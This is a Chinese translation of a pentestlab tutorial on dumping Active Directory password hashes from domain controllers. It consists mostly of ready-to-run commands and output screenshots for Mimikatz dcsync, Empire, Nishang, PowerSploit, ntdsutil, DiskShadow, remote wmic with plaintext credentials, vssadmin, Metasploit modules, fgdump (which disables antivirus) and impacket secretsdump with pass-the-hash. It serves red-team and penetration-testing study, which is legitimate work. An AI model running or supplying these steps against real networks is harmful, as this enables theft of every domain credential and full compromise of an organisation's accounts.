****

**在域内HASH是存在NTDS.DIT中的，
NTDS.DIT是一个二进制文件，就等同于本地计算机的SAM文件，它的存放位置是%SystemRoot%\ntds\NTDS.DIT。这里面包含的不只是Username和HASH，还有OU、Group等信息。**

和SAM文件一样，该文件也是被系统锁定的。因此，我们也无法直接将其复制并拷贝至其它位置，以提取其中的信息。

以下是几种最常见的被用于提取.dit文件信息的技术：

1.Domain Controller Replication Services（域控制器复制服务）

2.Native Windows Binaries

3.WMI

## Mimikatz

Mimikatz有一个功能（dcsync），利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。该技术消除了直接从域控制器进行认证的必要性，因为它可以从域管理员环境中属于域的任意系统执行。因此，这也是一项用于红队的标准技术。

    
    
    lsadump::dcsync /domain:pentestlab.local /all /csv

![1mimikatz-dump-domain-hashes-via-dcsync-clear-version.png](https://image.3001.net/images/20180717/15317924197656.png!small)

通过使用/user参数指定域用户名，Mimikatz会将该指定用户的所有帐户信息转储包括哈希值。

    
    
    lsadump::dcsync /domain:pentestlab.local /user:test

![2mimikatz-dump-user-hash-via-dcsync.png](https://image.3001.net/images/20180717/15317924352096.png!small)

或者我们可以直接在域控制器中执行Mimikatz，通过lsass.exe进程dump密码哈希。

    
    
    privilege::debug
    lsadump::lsa /inject

![3mimikatz-dump-domain-hashes-via-lsass.png](https://image.3001.net/images/20180717/15317924519930.png!small)

此时，将会检索域用户的密码哈希值。

![4mimikatz-dump-domain-hashes-via-lsadump.png](https://image.3001.net/images/20180717/15317924665110.png!small)

## Empire

PowerShell Empire有两个模块，可以通过DCSync攻击检索域哈希。
这两个模块都需要以域管理员的权限执行，并且他们都使用Microsoft复制服务。这两个模块依赖于Invoke-Mimikatz
PowerShell脚本，来执行与DCSync相关的Mimikatz命令。以下模块的哈希提取格式类似于Metasploit hashdump的输出格式。

    
    
    usemodule credentials/mimikatz/dcsync_hashdump

![5empire-dcsync-hashdump-module-clean.png](https://image.3001.net/images/20180717/15317924824346.png!small)

DCSync模块需要我们指定用户，以提取帐户的所有信息。

![6empire-dcsync-module.png](https://image.3001.net/images/20180717/15317924962007.png!small)

执行完成后，我们将获取到以下信息：

![7empire-dcsync-account-information.png](https://image.3001.net/images/20180717/15317925119606.png!small)

## Nishang

[Nishang](https://github.com/samratashok/nishang)是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合，并被广泛应用于渗透测试的各个阶段。[Copy-VSS](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1)脚本可用于自动化的提取需要的文件：NTDS.DIT，SAM和SYSTEM。这些文件将被提取到当前的工作目录或你指定的文件夹中。

    
    
    Import-Module .\Copy-VSS.ps1
    Copy-VSS
    Copy-VSS -DestinationDir C:\ShadowCopy\

![8nishang-extract-ntds-powershell.png](https://image.3001.net/images/20180717/15317925283326.png!small)

或者，可以通过加载PowerShell扩展，来从现有的Meterpreter会话中执行脚本。

    
    
    load powershell
    powershell_import /root/Copy-VSS.ps1
    powershell_execute Copy-VSS

![9nishang-extract-ntds-meterpreter.png](https://image.3001.net/images/20180717/15317925446597.png!small)

也可以使用powershell_shell命令建立一个PowerShell会话，通过导入脚本来提取文件。

    
    
    Copy-VSS
    Copy-VSS -DestinationDir C:\Ninja

## ![10nishang-extract-ntds-meterpreter-powershell.png](https://image.3001.net/images/20180717/15317925605860.png!small)

## PowerSploit

PowerSploit包含PowerShell脚本，该脚本使用卷影复制服务创建可用于提取文件的新卷。

    
    
    Import-Module .\VolumeShadowCopyTools.ps1
    New-VolumeShadowCopy -Volume C:\
    Get-VolumeShadowCopy 

![11powersploit-volumeshadowcopytools.png](https://image.3001.net/images/20180717/15317925786162.png!small)

或者通过加载PowerShell扩展，从现有的Meterpreter会话中执行。

    
    
    powershell_shell
    New-VolumeShadowCopy -Volume C:\
    Get-VOlumeShadowCopy
    

![12powersploit-volume-shadow-copy.png](https://image.3001.net/images/20180717/15317925968586.png!small)

可以使用copy命令将文件从新卷复制到目标。

## Invoke-DCSync

[Invoke-DCSync](https://gist.github.com/monoxgas/9d238accd969550136db)是一个由[Nick
Landers](https://twitter.com/monoxgas)和leverages
PowerView开发的PowerShell脚本，Invoke-ReflectivePEInjection和PowerKatcher使用Mimikatz的DCSync方法来检索哈希值。直接执行该函数将生成以下输出：

    
    
    Invoke-DCSync

![13invoke-dcsync-powershell.png](https://image.3001.net/images/20180717/15317926624115.png!small)

可以看到结果是以表格的形式输出的。如果我们添加-PWDumpFormat参数，则输出格式为user:id:lm:ntlm:::

    
    
    Invoke-DCSync -PWDumpFormat

![14invoke-dcsync-powershell-pwdump-format.png](https://image.3001.net/images/20180717/15317926836808.png!small)

从现有的Meterpreter会话中运行脚本，可以获取到相同的输出结果。

![15invoke-dcsync-metasploit.png](https://image.3001.net/images/20180717/15317927003910.png!small)

添加-PWDumpFormat参数后：

![16invoke-dcsync-metasploit-pwdump-format.png](https://image.3001.net/images/20180717/15317927147707.png!small)

## ntdsutil

ntdsutil是一个命令行工具，是域控制器生态系统的一部分，其主要用途是使管理员能够轻松访问和管理Windows Active
Directory数据库。但它常被渗透测试人员或红队队员滥用来获取现有的ntds.dit文件快照，并且可以将该文件复制到新的租约中，以进行离线的分析和密码哈希的提取。

    
    
    ntdsutil
    activate instance ntds
    ifm
    create full C:\ntdsutil
    quit
    quit

![17ntdsutil.png](https://image.3001.net/images/20180717/15317929648572.png!small)

它将为我们生成两个新文件夹：Active Directory和Registry。NTDS.DIT文件将被保存到Active
Directory中，而SAM和SYSTEM文件则将被保存到Registry文件夹中。

![18ntdsutil-ntds.png](https://image.3001.net/images/20180717/15317929841879.png!small)

## DiskShadow

DiskShadow是一个Microsoft签名二进制文件，用于协助管理员执行与卷影复制服务（VSS）相关的操作。这个二进制文件有两个模式interactive和script
，脚本将包含自动执行NTDS.DIT提取过程所需的所有命令。我们可以在脚本文件中添加以下行，以创建新的volume shadow
copy（卷影复制），挂载新驱动，执行复制命令以及删除volume shadow copy。

    
    
    set context persistent nowriters
    add volume c: alias someAlias
    create
    expose %someAlias% z:
    exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
    delete shadows volume %someAlias%
    reset

需要注意的是，DiskShadow二进制文件需要从C:\Windows\System32路径执行。如果从其它路径调用它，脚本将无法正确执行。

    
    
    diskshadow.exe /s c:\diskshadow.txt

![19diskshadow.png](https://image.3001.net/images/20180717/1531793011813.png!small)

直接从解释器运行以下命令，将列出系统的所有可用volume shadow copy。

    
    
    diskshadow
    LIST SHADOWS ALL

![20diskshadow-retrieve-shadow-copies.png](https://image.3001.net/images/20180717/153179304324.png!small)

SYSTEM注册表hive也应该被复制，因为其包含了解密NTDS文件内容所需的密钥。

    
    
    reg.exe save hklm\system c:\exfil\system.bak
    

## ![21diskshadow-copy-system-from-registry.png](https://image.3001.net/images/20180717/15317930654338.png!small)

## WMI

[Sean
Metcalf](https://twitter.com/PyroTek3)在他的博客中证明，可以通过WMI远程提取NTDS.DIT和SYSTEM文件。该项技术利用vssadmin二进制文件来创建卷影复制。

    
    
    wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
    

![22wmi-create-volume-shadow-copy.png](https://image.3001.net/images/20180717/15317930866708.png!small)

然后，它将远程执行复制命令，并将卷影复制中的NTDS.DIT文件提取到目标系统上的另一个目录中。

    
    
    wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"

![23wmi-copy-ntds-file.png](https://image.3001.net/images/20180717/15317931062602.png!small)

这也同样适用于SYSTEM文件。

    
    
    wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
    

![24wmi-copy-system-file.png](https://image.3001.net/images/20180717/15317931277446.png!small)

之后，被提取的文件将会从域控制器被传输到另一个Windows系统，以转储域密码哈希值。

    
    
    PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
    PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp

![25wmi-transfer-files-via-copy.png](https://image.3001.net/images/20180717/15317931547367.png!small)

如果已生成黄金票据，则可以使用它代替凭据，通过Kerberos与域控制器进行身份验证。

## vssadmin

volume shadow copy是一个Windows命令行实用程序，管理员可以使用它备份计算机，卷以及文件（即使操作系统正在使用这些资源）。Volume
Shadow
Copy作为一个服务运行，并要求文件系统的格式为NTFS（默认情况下windows操作系统文件格式均为NTFS）。从Windows命令提示符执行以下命令，将会创建一个C盘的快照，这样我们就可以将其复制到另一个位置（如本地文件夹，网络文件夹或可移动介质）以获取它的访问权限。

    
    
    vssadmin create shadow /for=C:

![26vssadmin-create-volume-shadow-copy.png](https://image.3001.net/images/20180717/15317931759208.png!small)

由于我们已经将C盘中的所有文件都复制到了另一个位置（HarddiskVolumeShadowCopy1），因此它们不会被操作系统直接使用，我们可以随意访问并复制其中的文件。使用copy命令将NTDS.DIT和SYSTEM文件，复制到本地名为ShadowCopy的驱动中的新建文件夹中。

    
    
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
    

![27copy-files-from-volume-shadow-copy.png](https://image.3001.net/images/20180717/15317932001520.png!small)

我们需要将这些文件从域控制器复制到另一个主机以进一步的处理。

![28shadowcopy-files.png](https://image.3001.net/images/20180717/15317932242812.png!small)

##  vssown

[Tim
Tomes](https://twitter.com/lanmaster53)开发了一个与vssadmin类似的实用程序[vssown](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)，它可以创建和删除卷影复制，从未挂载的卷影复制运行任意可执行文件，以及启动和停止卷影复制服务。

    
    
    cscript vssown.vbs /start
    cscript vssown.vbs /create c
    cscript vssown.vbs /list
    cscript vssown.vbs /delete 
    

![29vssown-volume-shadow-copy.png](https://image.3001.net/images/20180717/15317932449222.png!small)

所需文件可以使用copy命令来复制。

    
    
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\vssown
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SYSTEM C:\vssown
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SAM C:\vssown

## ![30vssown-copy-ntds-system-and-sam-files.png](https://image.3001.net/images/20180717/15317932699173.png)

## Metasploit

Metasploit框架中有一个模块，可以通过SMB服务直接与域控制器进行身份验证，创建系统驱动的卷影复制，并将NTDS.DIT和SYSTEM
hive的副本下载到Metasploit目录中。这些文件可以与impacket等其他工具一起使用，这些工具可用于执行活动目录密码哈希值的提取。

    
    
    auxiliary/admin/smb/psexec_ntdsgrab

![31metasploit-ntds-module.png](https://image.3001.net/images/20180717/1531793289956.png!small)

还有一个后利用模块，可以链接到现有的Meterpreter会话，并通过ntdsutil方法检索域哈希。

    
    
    windows/gather/credentials/domain_hashdump

![32metasploit-domain-hashdump.png](https://image.3001.net/images/20180717/15317933106984.png!small)

或者，如果有现成的到域控制器的Meterpreter会话，则可以使用hashdump命令。但该方法并不安全，因为它很有可能会导致域控制器崩溃。

    
    
    hashdump

## ![33metasploit-hashdump-on-dc.png](https://image.3001.net/images/20180717/15317933328094.png!small)

## fgdump

[fgdump](http://www.foofus.net/fizzgig/fgdump/fgdump-2.1.0-exeonly.zip)是一个用于提取LanMan和NTLM密码哈希值的工具。如果已获取本地管理员凭据，则可以在本地或远程执行。在执行期间，fgdump将尝试禁用系统上运行的杀毒软件，如果成功，则会将所有数据写入到两个文件中。如果存在杀软，则建议最好不要使用fgdump来转储密码哈希。因为，大多数安全公司的杀毒软件（包括Microsoft的Windows
Defender）都对其进行了标记。

    
    
    fgdump.exe

![34fgdump-domain-controller.png](https://image.3001.net/images/20180717/15317933566861.png!small)

通过检查.pwdump文件的内容来检索密码哈希值。

    
    
    type 127.0.0.1.pwdump

## ![35fgdump-pwdump-file.png](https://image.3001.net/images/20180717/15317933796738.png!small)

## NTDS 窃取

Impacket是一组python脚本，可用于执行各种任务，包括提取NTDS文件的内容。impacket-secretsdump模块需要我们提供SYSTEM和NTDS数据库文件。

    
    
    impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
    

![36impacket-extract-ntds-contents.png](https://image.3001.net/images/20180717/1531793414377.png!small)

此外，impacket可以通过使用计算机帐户及其哈希进行身份验证从NTDS.DIT文件远程转储域密码哈希。

    
    
    impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1

![37impacket-extract-ntds-contents-remotely.png](https://image.3001.net/images/20180717/15317934404899.png!small)

作为impacket的替代解决方案，[NTDSDumpEx](https://github.com/zcgonvh/NTDSDumpEx)二进制文件可以从Windows主机中提取域密码哈希值。

    
    
    NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive

![38ntdsdumpex.png](https://image.3001.net/images/20180717/15317934742442.png)

还有一个shell脚本[adXtract](https://github.com/LordNem/adXtract)，可将用户名和密码哈希导出为一种可被常见的密码破解程序使用的格式，例如John
the Ripper和Hashcat。

    
    
    ./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab

![39adxtract.png](https://image.3001.net/images/20180717/15317935044264.png!small)

该脚本将所有信息写入项目名称下的各个文件中，当数据库文件NTDS的解密完成后，用户列表和密码哈希值将会导出到控制台中。该脚本将为我们提供大量有关域用户的信息，如下所示。

![40adxtract-list-of-users.png](https://image.3001.net/images/20180717/15317935347933.png!small)

密码哈希将以下列格式显示。

![41adxtract-password-hashes.png](https://image.3001.net/images/20180717/15317935572218.png!small)

 ***参考来源：[pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

